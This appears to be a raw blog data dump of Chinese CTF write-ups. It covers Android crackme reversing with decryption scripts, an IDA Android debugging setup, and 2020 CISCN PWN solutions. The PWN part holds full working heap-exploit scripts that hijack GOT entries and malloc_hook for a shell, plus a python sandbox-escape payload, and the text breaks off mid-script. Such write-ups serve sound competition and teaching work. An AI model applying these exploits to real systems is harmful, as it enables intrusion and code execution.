0x3D3D7965;    v12 = 0x6B747365;    v11 = 0x74617369;    v10 = 0x73696874;    v4 = (char *)(*a1)-&gt;GetStringUTFChars(a1, (jstring)a4, 0);    v5 = (const char *)AES_128_ECB_PKCS5Padding_Encrypt(v4, (int)&amp;v10);    (*a1)-&gt;ReleaseStringUTFChars(a1, (jstring)a4, v4);    result = (int)(*a1)-&gt;NewStringUTF(a1, v5);  &#125;  else  &#123;    v7 = UNSIGNATURE[0];    v8 = (*a1)-&gt;NewString;    v9 = strlen(UNSIGNATURE[0]);    result = (int)v8(a1, (const jchar *)v7, v9);  &#125;  return result;&#125;\n\n可以发现, 加密方式为aes加密, key 为 v10中的内容.为thisisatestkey&#x3D;&#x3D;\n对VEIzd&#x2F;V2UPYNdn&#x2F;bxH3Xig&#x3D;&#x3D; 解密为aimagetencent, 发现提交flag错误, 重新找另一个字符串,在FileDataActivity类中找到如下.\npublic class FileDataActivity extends a &#123;  private TextView c;    protected void onCreate(Bundle paramBundle) &#123;    super.onCreate(paramBundle);    setContentView(2130903042);    this.c = (TextView)findViewById(2131165184);    this.c.setText(Encryto.decode(this, &quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;));  &#125;&#125;\n\n调用了decode函数, 而decode函数与doRawData实现一样, 直接与之前一样的AES ecb解密, 得到flag\nPh0en1x-100下载\n来源:攻防世界\n程序流程, 输入flag\njd-gui反编译如下:\npublic void onGoClick(View paramView) &#123;   paramView = this.etFlag.getText().toString();   if (getSecret(getFlag()).equals(getSecret(encrypt(paramView)))) &#123;     Toast.makeText(this, &quot;Success&quot;, 1).show();   &#125;   for (;;)   &#123;     return;     Toast.makeText(this, &quot;Failed&quot;, 1).show();   &#125; &#125;\n\ngetFlag函数与encrypt函数是native层\nstatic&#123;  System.loadLibrary(&quot;phcm&quot;);&#125;public native String encrypt(String paramString);public native String getFlag();\n\n\n\n反编译libphcm.so文件\nint __cdecl Java_com_ph0en1x_android_1crackme_MainActivity_encrypt(JNIEnv *a1, int a2, int a3)&#123;  size_t i; // esi  const char *s; // edi  i = 0;  for ( s = (*a1)-&gt;GetStringUTFChars(a1, (jstring)a3, 0); i &lt; strlen(s); --s[i++] )    ;  return (*a1)-&gt;NewStringUTF(a1, s);&#125;\n\n以上加密就是对字符串中的每个字符-1\nint __cdecl Java_com_ph0en1x_android_1crackme_MainActivity_getFlag(JNIEnv *a1)&#123;  signed int v1; // esi  char *v2; // edi  char v3; // al  int result; // eax  int v5; // [esp+26h] [ebp-46h]  int v6; // [esp+2Ah] [ebp-42h]  int v7; // [esp+2Eh] [ebp-3Eh]  __int16 v8; // [esp+32h] [ebp-3Ah]  int v9; // [esp+34h] [ebp-38h]  int v10; // [esp+38h] [ebp-34h]  int v11; // [esp+3Ch] [ebp-30h]  int v12; // [esp+40h] [ebp-2Ch]  int v13; // [esp+44h] [ebp-28h]  int v14; // [esp+48h] [ebp-24h]  int v15; // [esp+4Ch] [ebp-20h]  int v16; // [esp+50h] [ebp-1Ch]  int v17; // [esp+54h] [ebp-18h]  int v18; // [esp+58h] [ebp-14h]  unsigned int v19; // [esp+5Ch] [ebp-10h]  v1 = 38;  v2 = (char *)&amp;v18 + 2;  v9 = 1279407662;  v10 = 987807583;  v19 = __readgsdword(0x14u);  v11 = 1663091624;  v12 = 482391945;  v13 = 683820061;  v14 = 235072895;  v15 = 2559534685;  v16 = 382777269;  v17 = 4227367757;  v18 = 4670209;  v5 = 1819043144;  v6 = 1750081647;  v7 = 829318448;  v8 = 120;  do  &#123;    v3 = *v2--;    v2[1] = (*((_BYTE *)&amp;v5 + v1-- % 13) ^ (v3 + 1 - *v2)) - 1;  &#125;  while ( v1 );  LOBYTE(v9) = (v9 ^ 0x48) - 1;  result = (int)(*a1)-&gt;NewStringUTF(a1, (const char *)&amp;v9);  if ( __readgsdword(0x14u) != v19 )    sub_4B0();  return result;&#125;\n\n这个加密稍微有点复杂. 若想获取flag, 先对上面这给逆出来, 在对encrypt加密加密函数给再逆出来即可获得flag, 但是, 我写了一个c脚本, 上面这个有问题, 主要是LOBYTE(v9) &#x3D; (v9 ^ 0x48) - 1;这个语句不好写.换另一种思路.动态调试(瞎弄半天, 啥也没弄出来), 再换另一种, 就是使用Android killer修改smali源码, 将其getFlag函数的字符串给打印出来, 只需将打印失败逻辑添加一下getFlag函数, 将getFlag字符串覆盖为打印失败的字符串, 复制上面调用getFlag的即可, 再更变一下变量, 如下\n.line 37   :cond_0   const-string v1, &quot;Failed&quot;      invoke-virtual &#123;p0&#125;, Lcom/ph0en1x/android_crackme/MainActivity;-&gt;getFlag()Ljava/lang/String;   move-result-object v1   // getFlag()函数的返回值,(字符串)      invoke-static &#123;p0, v1, v3&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;   move-result-object v1   invoke-virtual &#123;v1&#125;, Landroid/widget/Toast;-&gt;show()V\n\n然后点击Android-&gt;编译, 即可再次编译为apk文件, 安装再nox中运行, 随便输入就会出现ekfz@q2^x/t^fn0mF^6/^rbqanqntfg^E&#96;hq|\n再次让每个字符+1就可得到flag\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void) &#123;\tchar flag[] = &quot;ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|&quot;;\tfor(int i = 0; i &lt; strlen(flag); ++i) &#123;\t\tputchar(++flag[i]);\t&#125;\treturn 0;&#125;\n\n\n\napp1下载\n来源:攻防世界\npublic void onClick(View paramView) &#123;   for (;;)   &#123;     try     &#123;       str = this.this$0.text.getText().toString();       PackageInfo localPackageInfo = this.this$0.getPackageManager().getPackageInfo(&quot;com.example.yaphetshan.tencentgreat&quot;, 16384);       paramView = localPackageInfo.versionName;       int i = localPackageInfo.versionCode;       j = 0;       if ((j &gt;= str.length()) || (j &gt;= paramView.length())) &#123;         continue;       &#125;       if (str.charAt(j) != (paramView.charAt(j) ^ i))       &#123;         Toast.makeText(this.this$0, &quot;再接再励~&quot;, 1).show();         return;       &#125;     &#125;     catch (PackageManager.NameNotFoundException paramView)     &#123;       String str;       int j;       Toast.makeText(this.this$0, &quot;不要玩小聪明&quot;, 1).show();       continue;     &#125;     j++;     continue;     if (str.length() != paramView.length()) &#123;       continue;     &#125;     Toast.makeText(this.this$0, &quot;恭喜开启芝麻之门&quot;, 1).show();   &#125; &#125;\n\n\n\n在BuildConfig class中找到versionName和versionCode\npackage com.example.yaphetshan.tencentgreat;public final class BuildConfig&#123;  public static final String APPLICATION_ID = &quot;com.example.yaphetshan.tencentgreat&quot;;  public static final String BUILD_TYPE = &quot;debug&quot;;  public static final boolean DEBUG = Boolean.parseBoolean(&quot;true&quot;);  public static final String FLAVOR = &quot;&quot;;  public static final int VERSION_CODE = 15;  public static final String VERSION_NAME = &quot;X&lt;cP[?PHNB&lt;P?aj&quot;;&#125;\n\n解密脚本\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void) &#123;\tchar name[] = &quot;X&lt;cP[?PHNB&lt;P?aj&quot;;\tfor(int i = 0; i &lt; strlen(name); ++i)\t\tputchar(name[i] ^15);\treturn 0;&#125;\n\n\n\n\n\neasyjni下载\n来源:攻防世界\n反编译java如下:\nclass MainActivity$1  implements View.OnClickListener&#123;  MainActivity$1(MainActivity paramMainActivity, Context paramContext) &#123;&#125;    public void onClick(View paramView)  &#123;    paramView = (EditText)((MainActivity)this.a).findViewById(2131427445);    if (MainActivity.a(this.b, paramView.getText().toString())) &#123;      Toast.makeText(this.a, &quot;You are right!&quot;, 1).show();    &#125;    for (;;)    &#123;      return;      Toast.makeText(this.a, &quot;You are wrong! Bye~&quot;, 1).show();    &#125;  &#125;&#125;\n\n\n\npublic class MainActivity  extends c&#123;  static  &#123;    System.loadLibrary(&quot;native&quot;);  &#125;    private boolean a(String paramString)  &#123;    try    &#123;      a locala = new com/a/easyjni/a;      locala.&lt;init&gt;();      bool = ncheck(locala.a(paramString.getBytes()));      return bool;    &#125;    catch (Exception paramString)    &#123;      for (;;)      &#123;        boolean bool = false;      &#125;    &#125;  &#125;    private native boolean ncheck(String paramString);\n\n\n\n从以上代码可以看到, 对输入的数据先进行base64加密, 然后调用native层的ncheck函数判断是否正确.\nida打开libnative.so文件, 反编译ncheck函数如下:\nsigned int __fastcall Java_com_a_easyjni_MainActivity_ncheck(JNIEnv *a1, int a2, int a3)&#123;  int v3; // r8  JNIEnv *v4; // r5  int v5; // r8  const char *str; // r6  int i; // r0  char *v8; // r2  char v9; // r1  int v10; // r0  bool v11; // nf  unsigned __int8 v12; // vf  int v13; // r1  signed int result; // r0  char en_str[32]; // [sp+3h] [bp-35h]  char v16; // [sp+23h] [bp-15h]  int v17; // [sp+28h] [bp-10h]  v17 = v3;  v4 = a1;  v5 = a3;  str = (const char *)((int (__fastcall *)(JNIEnv *, int, _DWORD))(*a1)-&gt;GetStringUTFChars)(a1, a3, 0);  if ( strlen(str) == 32 )  &#123;    i = 0;    do    &#123;      v8 = &amp;en_str[i];      en_str[i] = str[i + 16];      v9 = str[i++];      v8[16] = v9;    &#125;    while ( i != 16 );    ((void (__fastcall *)(JNIEnv *, int, const char *))(*v4)-&gt;ReleaseStringUTFChars)(v4, v5, str);    v10 = 0;    do    &#123;      v12 = __OFSUB__(v10, 30);      v11 = v10 - 30 &lt; 0;      v16 = en_str[v10];      en_str[v10] = en_str[v10 + 1];      en_str[v10 + 1] = v16;      v10 += 2;    &#125;    while ( v11 ^ v12 );    v13 = memcmp(en_str, &quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;, 0x20u);    result = 0;    if ( !v13 )      result = 1;  &#125;  else  &#123;    ((void (__fastcall *)(JNIEnv *, int, const char *))(*v4)-&gt;ReleaseStringUTFChars)(v4, v5, str);    result = 0;  &#125;  return result;&#125;\n\n以上代码经过了两次加密, 先进行str[i]与str[i + 16]的交换, 再进行str[i]与str[i + 1]进行交换.\n解密脚本如下:\n#include &lt;stdio.h&gt;void decode() &#123;        char code[] = &quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;;        for(int i = 0; i &lt; 32;  i += 2) &#123;                char ch = code[i];                code[i] = code[i + 1];                code[i + 1] = ch;        &#125;        //printf(&quot;%s&quot;, code);        for(int i = 0; i &lt; 16; i ++) &#123;                char ch = code[i];                code[i] = code[i + 16];                code[i + 16] = ch;        &#125;        printf(&quot;%s&quot;, code);&#125;void show_arr() &#123;        char arr[] = &#123; 105, 53, 106, 76, 87, 55, 83, 48, 71, 88, 54, 117, 102, 49, 99, 118, 51, 110, 121, 52, 113, 56, 101, 115, 50, 81, 43, 98, 100, 107, 89, 103, 75, 79, 73, 84, 47, 116, 65, 120, 85, 114, 70, 108, 86, 80, 122, 104, 109, 111, 119, 57, 66, 72, 67, 77, 68, 112, 69, 97, 74, 82, 90, 78, 0 &#125;;        printf(&quot;%s\\n&quot;, arr);&#125;int main(void) &#123;        show_arr();        decode();        return 0;&#125;\n\n解密base64\nimport base64import stringstr1 = &quot;QAoOQMPFks1BsB7cbM3TQsXg30i9g3==&quot;string1 = &quot;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (b&#x27;code: &#x27; + base64.b64decode(str1.translate(str.maketrans(string1,string2))))\n\n\n\n\n\neasy apk下载\n来源: 攻防世界\nclass MainActivity$1  implements View.OnClickListener&#123;  MainActivity$1(MainActivity paramMainActivity) &#123;&#125;    public void onClick(View paramView)  &#123;    paramView = ((EditText)this.this$0.findViewById(2131427445)).getText().toString();    if (new Base64New().Base64Encode(paramView.getBytes()).equals(&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;)) &#123;      Toast.makeText(this.this$0, &quot;验证通过!&quot;, 1).show();    &#125;    for (;;)    &#123;      return;      Toast.makeText(this.this$0, &quot;验证失败!&quot;, 1).show();    &#125;  &#125;&#125;\n\nbase64加密如下\npublic class Base64New&#123;  private static final char[] Base64ByteToStr = &#123; 118, 119, 120, 114, 115, 116, 117, 111, 112, 113, 51, 52, 53, 54, 55, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 121, 122, 48, 49, 50, 80, 81, 82, 83, 84, 75, 76, 77, 78, 79, 90, 97, 98, 99, 100, 85, 86, 87, 88, 89, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 56, 57, 43, 47 &#125;;  private static final int RANGE = 255;  private static byte[] StrToBase64Byte = new byte[&#x27;?&#x27;];    public String Base64Encode(byte[] paramArrayOfByte)  &#123;    StringBuilder localStringBuilder = new StringBuilder();    for (int i = 0; i &lt;= paramArrayOfByte.length - 1; i += 3)    &#123;      byte[] arrayOfByte = new byte[4];      int j = 0;      int k = 0;      if (k &lt;= 2)      &#123;        if (i + k &lt;= paramArrayOfByte.length - 1) &#123;          arrayOfByte[k] = ((byte)(byte)((paramArrayOfByte[(i + k)] &amp; 0xFF) &gt;&gt;&gt; k * 2 + 2 | j));        &#125;        for (j = (byte)(((paramArrayOfByte[(i + k)] &amp; 0xFF) &lt;&lt; (2 - k) * 2 + 2 &amp; 0xFF) &gt;&gt;&gt; 2);; j = 64)        &#123;          k++;          break;          arrayOfByte[k] = ((byte)j);        &#125;      &#125;      arrayOfByte[3] = ((byte)j);      j = 0;      if (j &lt;= 3)      &#123;        if (arrayOfByte[j] &lt;= 63) &#123;          localStringBuilder.append(Base64ByteToStr[arrayOfByte[j]]);        &#125;        for (;;)        &#123;          j++;          break;          localStringBuilder.append(&#x27;=&#x27;);        &#125;      &#125;    &#125;    return localStringBuilder.toString();  &#125;&#125;\n\n以上加密是对输入进行了一个base64换表的加密\n解密脚本如下\nimport base64import stringbase_table = [ 118, 119, 120, 114, 115, 116, 117, 111, 112, 113, 51, 52, 53, 54, 55, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 121, 122, 48, 49, 50, 80, 81, 82, 83, 84, 75, 76, 77, 78, 79, 90, 97, 98, 99, 100, 85, 86, 87, 88, 89, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 56, 57, 43, 47 ];string1 = &#x27;&#x27;code = &#x27;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&#x27;for i in range(len(base_table)):    string1 += chr(base_table[i])string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print(base64.b64decode(code.translate(str.maketrans(string1,string2))))\n\n","categories":["security"],"tags":["reverse"]},{"title":"调试安卓程序","url":"/2020/09/06/security/reverse/android/android-debuger/","content":"IDA 调试安卓工具:\nNox\nIDA\n进入Nox\\bin目录cd C:\\Program Files (x86)\\Nox\\bin\n\nadb连接模拟器nox_adb.exe connect 127.0.0.1:62001\n上传ida 监听文件adb push &#x27;C:\\Users\\b\\Desktop\\down\\IDA_Pro_v7.0_Portable\\dbgsrv/android_server &#x27; /data/local/tmp/\n\n运行ida监听文件adb shellcd /data/local/tmp/chmod +x android_server./android_server \n\n端口转发adb forward tcp:23946 tcp:23946\n\n启动所要调试的程序adb shell am start -D -n com.qipeimall/com.qipeimall.MainActivity\n\nIDA连接Debugger-&gt;Attach-&gt;..\n","categories":["security"],"tags":["reverse"]},{"title":"2020 CISCN PWN WP","url":"/2020/09/02/security/ctf/compitation/wp-2020-ciscn/","content":"2020 CISCN PWN WP当时只做了一道easybox, 但远程打不通, 菜….\n原题下载: https://github.com/I0gan/pwn/tree/master/matchs/2020_08_ciscn\n1-babyjsc难度1 &#x2F; 10\n简单描述使用Python模拟的终端, 先输入大小, 然后jsc数据执行jsc数据.\nvul使用python 模拟的终端\n知识点python sanbox escape\n思路python 沙箱逃逸\nEXPfrom pwn import *sh = remote(&#x27;0.0.0.0&#x27;, 0)p = &quot;__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)&quot;sh.sendline(len(p))sh.sendline(p)sh.interactive()\n\n\n\n2-NoFree难度5 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)\n\n简单描述只有添加和编辑\nvulchar *__fastcall sub_40095C(unsigned int size)&#123;  memset(p_addr, 0, 0x100uLL);  printf(&quot;content: &quot;, 0LL);  read_n(p_addr, size);  return strdup(p_addr);&#125;\n\n\n\nstrdup函数相当于包含了strlen + malloc + strcpy 函数, 根据字符串长度来malloc, 然后strcpy到开辟的空间里,然后在输入一定大小后, 再输入内容,内容中若出现’\\x00’字符截断, 则造成在edit模式堆溢出, 可以在同个index下开辟内存, 造成内存泄漏.\n知识点House of Orange, fastbin attack\n思路通过堆溢出漏洞修改top chunk 大小, 不断开辟内存, 直到开辟top chunk 快完毕, 使剩余的top chunk 为 fastbin size, 再开辟一块大的, 使剩余的部分为fastbin, 然后通过堆溢出修改fastbin fd为 p_addr + 0x100(堆指针数组), 在该数组中的大小要与fastbin 中的一致, 通过fastbin attack 打入 p_addr+ 0x100,  通过index 0控制 index 1 打入p_addr 设置字符串漏洞, 然后修改 memset 的got 表为printf的plt地址,再次开辟泄漏libc.再使用同样的方法修改atoi got表中的地址为system, 传入 ‘&#x2F;bin&#x2F;sh’即可 get shell\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;pwn&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(idx, size, data):\tsla(&#x27;&gt;&gt;&#x27;, str(1))\tsla(&#x27;:&#x27;, str(idx))\tsla(&#x27;:&#x27;, str(size))\tsa(&#x27;:&#x27;, data)def md(idx, data):\tsla(&#x27;:&#x27;, str(2))\tsla(&#x27;:&#x27;, str(idx))\tsa(&#x27;:&#x27;, data)#--------------------------Exploit--------------------------def exploit():\tad(0, 0x90, &#x27;A&#x27;)\tmd(0, &#x27;A&#x27; * 0x10 + p64(0) + p64(0xfe1))\tfor i in range(24):\t\tad(1, 0x90, &#x27;A&#x27; *0x90)\t\tad(0, 0x80, &#x27;A&#x27; * 0x70)\tad(0, 0x80, &#x27;A&#x27; * 0x10) # idx 0\tad(1, 0x40, &#x27;A&#x27; * 0x40) # make it as 0x21 fastbin\tp_addr = 0x6020c0\tmd(0, &#x27;A&#x27; * 0x10 + p64(0x20) + p64(0x20) + p64(p_addr + 0x100))\tad(0, 0x20, &#x27;A&#x27;) # Make the fastbin size as 0x20 for fastbin attaking\tad(0, 0x20, p64(exe.got[&#x27;memset&#x27;]) + p64(0x10)) # modify memset got table as printf\tmd(1, p64(exe.plt[&#x27;printf&#x27;])) \tmd(0, p64(p_addr))\tmd(1,&#x27;%17$p&#x27;)\t# Add one to call print leak libc\tsla(&#x27;&gt;&gt;&#x27;, str(1))\tsla(&#x27;:&#x27;, str(2))\tsla(&#x27;:&#x27;, str(0x40))\tru(&#x27;0x&#x27;)\tlibc_base = int(ru(&#x27;content&#x27;), 16) - (0x7ffff7a2d830 - 0x7ffff7a0d000)\tli(&#x27;libc_base &#x27; + hex(libc_base))\tsa(&#x27;:&#x27;, &#x27;A&#x27; * 0x20)\tlibc_sys = libc_base + lib.sym[&#x27;system&#x27;]\t# Modify atoi got tabel as system, then send /bin/sh to get shell\tmd(0, p64(exe.got[&#x27;atoi&#x27;]))\tmd(1, p64(libc_sys))\tsl(&#x27;/bin/sh&#x27;)\tdef finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()\n\n\n\n3-Easy box难度4 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\n简单描述只存在添加和删除功能\nvulqword_202040[v1] = size + 1;                  // vul off by oneqword_2020C0[v1] = malloc(size);puts(&quot;content:&quot;);read(0, qword_2020C0[v1], qword_202040[v1]);\n\n存在off by one漏洞\n知识点io-file, fastbin attack\n思路堆布局构成fastbin 打入 _IO_2_1_stderr + 192处, 泄漏libc, 再次使用用fastbin 打入 malloc_hook - 0x23处修改malloc_hook, realloc调整execve参数\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#context.log_level=&#x27;debug&#x27;exeFile = &#x27;easy_box&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;101.200.53.148&quot;remotePort = 34521LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(index, size, data):\tsla(&#x27;&gt;&gt;&gt;&#x27;, str(1))\tsla(&#x27;:&#x27;, str(index));\tsla(&#x27;:&#x27;, str(size))\tsa(&#x27;:&#x27;, data)def rm(idx):\tsla(&#x27;&gt;&gt;&gt;&#x27;, str(2))\tsla(&#x27;:&#x27;, str(idx))def q():\tsla(&#x27;:&#x27;, str(5))\t#--------------------------Exploit--------------------------def exploit():\tad(0, 0x68, &#x27;A&#x27;)\tad(1, 0x68, &#x27;B&#x27;)\tad(2, 0x68, &#x27;C&#x27;)\tad(3, 0x68, &#x27;D&#x27;)\t# Overflow to write chunk 1 size make chunk 1 to merge chunk 2\trm(0)\tad(0, 0x68, &#x27;\\x00&#x27; * 0x68 + p8(0xe1))\trm(1) # free as small bin\trm(2) # for fastbin attack\tad(4, 0x28, &#x27;\\x11&#x27; * 0x28)\tad(5, 0x38, &#x27;\\x22&#x27; * 0x38)\tad(6, 0x10, &#x27;\\xdd\\x25&#x27;)\t# recovery size\trm(5)\tad(5, 0x38, &#x27;\\x22&#x27; * 0x38 + p8(0x71))\tad(7, 0x68, &#x27;\\x00&#x27;)\tp = &#x27;\\x00&#x27; * 0x33 + p64(0xfbad3c80) + 3 * p64(0) + p8(0)\tad(8, 0x68, p)\tlibc_base = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base -= lib.sym[&#x27;_IO_2_1_stderr_&#x27;] + 192\tlib.address = libc_base\tmain_arena = libc_base + 0x3c4b20\tli(&#x27;libc_base: &#x27; + hex(libc_base))\trm(7) # for fastbin attack to main_arena - 0x33\t# recovery size as 0x21\trm(5)\tad(5, 0x38, &#x27;\\x22&#x27; * 0x38 + p8(0x21))\trm(6)\t# modify fastbin list\tad(6, 0x10, p64(main_arena - 0x33))\t\t# recovery size as 0x71\trm(5)\tad(0, 0x38, &#x27;\\x22&#x27; * 0x38 + p8(0x71))\tad(9, 0x68, &#x27;A&#x27;) # for ajust\t# attack to main_arena - 0x33\trealloc = lib.sym[&#x27;realloc&#x27;]\tgadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147, 0xcd0f3, 0xcd1c8]\tone_gadget = lib.address + gadgets[2]\tp = &#x27;\\xAA&#x27; * (0x13 - 0x8) + p64(one_gadget) + p64(realloc + 8)\tad(10, 0x68, p)\t\tsla(&#x27;&gt;&gt;&gt;&#x27;, str(1))\tsla(&#x27;:&#x27;, str(11));\tsla(&#x27;:&#x27;, str(0x10))def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tfor i in range(100):\t\ttry:\t\t\tif LOCAL:\t\t\t\texe = ELF(exeFile)\t\t\t\tif LIB:\t\t\t\t\tlib = ELF(libFile)\t\t\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\t\t\telse:\t\t\t\t\tio = exe.process()\t\t\t\tbreak\t\t\t\t\t\telse:\t\t\t\texe = ELF(exeFile)\t\t\t\tio = remote(remoteIp, remotePort)\t\t\t\tif LIB:\t\t\t\t\tlib = ELF(libFile)\t\t\texploit()\t\t\tfinish()\t\texcept:\t\t\tc()\t\texploit()\tfinish()\n\n\n\n4-maj难度5&#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x3ff000)\n\n简单描述以前在v&amp;n面试中, 有位师傅面过我这类型的, 基本思路也差不多, 经典的heap题, 有花指令影响逆向分析, 简单的添加功能,而添加功能所输入的字符临时储存在全局变量区中, 只有编辑功能才对堆区写入数据,还有删除功能, 打印功能没有。\nvul在删除功能中, free后指针没有清0\nelse&#123;  sub_400846(dword_603010, dword_60303C + 1, dword_603040);&#125;free(p_addr[v3]);                           // vul : not set ptr as nullif ( dword_60303C / dword_603010 &gt; 1 )\n\n\n\n知识点uaf, fastbin attack, IO file attack\n思路使用fastbin attack 打入_IO_2_1_stdout中泄漏libc, 然后再使用fastbin attack 此打入malloc_hook - 0x23处打one_gadget, realloc调整execve参数\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;elf_path  = &#x27;maj&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;0.0.0.0&quot;server_port = 0# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(s, d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;question&#x27;, &#x27;80&#x27;)\tsla(&#x27;?&#x27;, str(s))\tsa(&#x27;?&#x27;, d)\tdef rm(i):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;?&#x27;, str(i))def md(i, d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)\tsla(&#x27;?&#x27;, str(i))\tsa(&#x27;?&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad(0x20, &#x27;A&#x27; * 0x10) # fastbin attack unsorted bin - 0x10\tad(0x60, &#x27;A&#x27;) # fake chunk\tad(0x80, &#x27;A&#x27;) # partial write fastbin attack to _IO_2_1_stderr + 157\tad(0x20, &#x27;A&#x27;) # fastbin attack to unsorted bin - 0x10\tad(0x60, &#x27;A&#x27;) # idx 4 modify chunk 2 connect fastbin then attack to _IO_2_1_stdout\t# for fastbin attack to _free_hook\tad(0x60, &#x27;A&#x27;) # idx 5 fa to malloc_hook - 0x23\tad(0x60, &#x27;A&#x27;) # idx 6 \t\t# create fastbin attack\trm(3)\trm(0)\trm(3)\t# free chunk2 make fd value as main_arena + 0x58\trm(2)\tad(0x20, &#x27;A&#x27;) # 7\tmd(7, &#x27;\\x90&#x27;)\tad(0x20, &#x27;A&#x27;) # 8\tad(0x20, &#x27;A&#x27;) # 9\tmd(1, b&#x27;A&#x27; * 0x50 + p64(0) + p64(0x31))\tad(0x20, &#x27;A&#x27;) # 